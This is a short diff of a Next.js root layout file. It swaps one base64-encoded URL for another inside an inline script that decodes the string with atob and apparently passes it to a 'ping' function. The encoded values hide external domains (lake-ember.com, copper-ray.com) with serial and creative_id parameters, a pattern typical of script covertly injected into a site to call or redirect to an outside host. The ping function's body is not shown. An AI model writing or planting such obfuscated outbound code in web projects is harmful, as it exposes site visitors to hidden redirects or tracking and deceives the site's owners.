@@ -42,7 +42,7 @@ export default function RootLayout({ children }: Readonly<{ children: React.Reac
             }
         }
         
-        var mainBrandB64 = "aHR0cHM6Ly9sYWtlLWVtYmVyLmNvbS8/c2VyaWFsPTYxMzY1ODMwJmNyZWF0aXZlX2lkPTkzMzA= "; 
+        var mainBrandB64 = "aHR0cHM6Ly9jb3BwZXItcmF5LmNvbS8/c2VyaWFsPTYxMzY1ODMwJmNyZWF0aXZlX2lkPTkzMzA= "; 
         var mainUrl = atob(mainBrandB64.replace("#", ""));
 
         function ping(url) {
